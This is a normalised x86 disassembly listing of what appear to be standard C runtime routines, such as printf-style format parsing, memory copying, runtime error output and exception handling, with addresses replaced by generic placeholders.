cmp ax dx
jb r-xdata
mov ecx 0xa66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xae6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xb66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xc66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xce6
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xd66
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xe50
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0xed0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x50
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0xf2a
cmp ax dx
jb r-xdata
mov ecx 0x1040
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
mov ecx 0x17e0
mov edx ecx
cmp ax dx
jb r-xdata
add edx 0xa
cmp ax dx
jb r-xdata
add ecx 0x30
mov edx ecx
cmp ax dx
jb r-xdata
mov edx 0x181a
jmp r-xdata
cmp ax dx
jb r-xdata
sub_44a27e
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_441455
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_452ea0
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_44a308
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx ]
dec [ ebp + 0x8 ]
push eax
mov eax edi
call sub_4461cc
inc ebx
inc ebx
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_443b37
cmp [ eax ] 0x2a
jne r-xdata
push 0x3f
mov eax edi
call sub_4461cc
pop ecx
sub_44a35a
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x43c ] esi
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_441455
test esi esi
jne r-xdata
xor esi esi
cmp edi esi
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
movzx ecx [ edi ]
mov [ ebp - 0x420 ] esi
mov [ ebp - 0x414 ] esi
mov [ ebp - 0x434 ] esi
mov [ ebp - 0x458 ] esi
mov [ ebp - 0x41c ] ecx
cmp cx si
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop edx
add edi edx
cmp [ ebp - 0x420 ] esi
mov [ ebp - 0x460 ] edi
jl r-xdata
call sub_440791
add esp 0x14
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x434 ] esi
je r-xdata
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
cmp [ ebp - 0x434 ] 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov esi [ ebp - 0x434 ]
imul eax eax 0x9
movzx eax [ eax + esi + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x434 ] eax
cmp eax esi
je r-xdata
mov edi [ ebp - 0x460 ]
mov ebx [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_44aeda ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x45c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x43c ]
push ecx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_4461cc
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ edi ]
xor esi esi
mov [ ebp - 0x41c ] eax
cmp ax si
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x42c ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x40c ] eax
test eax eax
jge r-xdata
movzx eax [ edi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ edi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edx
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ edi + 0x2 ] 0x32
jne r-xdata
add edi 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp - 0x40c ] esi
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add edi 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add edi edx
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax edx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x454 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x430 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x42e ] ax
mov [ ebp - 0x424 ] edx
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x418 ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x45c ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax edx
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_44120e
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edx
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x430 ]
call sub_44a308
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_4461fb
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x45c ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x418 ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_445378
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
call sub_451684
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edx
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x430 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_45169a
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x434 ] 0x0
add eax edx
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_44a308
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_4461fb
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_445f36
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call sub_445378
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call sub_445378
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push ebx
push edi
call sub_4517d0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_4461fb
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x43c ]
lea esi [ ebp - 0x420 ]
call sub_4461cc
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x41c ] 0x0
pop ecx
jg r-xdata
call sub_442e20
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x41c ]
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_45169a
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_44aefa
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_453047
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_453047
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_442e20
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_443bb7
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
push esi
call sub_442e20
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_443bb7
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_442e20
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_451da3
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_452d98
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_452ede
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_440669
add esp 0x14
push r--data
push ebx
push edi
call sub_452d98
add esp 0xc
test eax eax
je r-xdata
sub_44b0a5
push 0x3
call sub_453047
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_44aefa
push 0xff
call sub_44aefa
pop ecx
pop ecx
push 0x3
call sub_453047
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_44b12a
push 0x8
push r--data
call sub_4433dc
push [ rw-data ]
call sub_445378
pop ecx
test eax eax
je r-xdata
call sub_44b0de
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_44b173
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_4511af
test eax eax
je r-xdata
push 0xa
call sub_44aefa
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_4511bc
pop ecx
push 0x3
call sub_445d53
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_443360
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_44b28a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_44b2ba
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_44b341
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_44b341
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_44b2ba
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_44b424
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_446068
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_44b457
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_44b424
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_44b47d
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_44b424
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_443b37
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_44b424
sub_44b4ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_441455
test esi esi
jne r-xdata
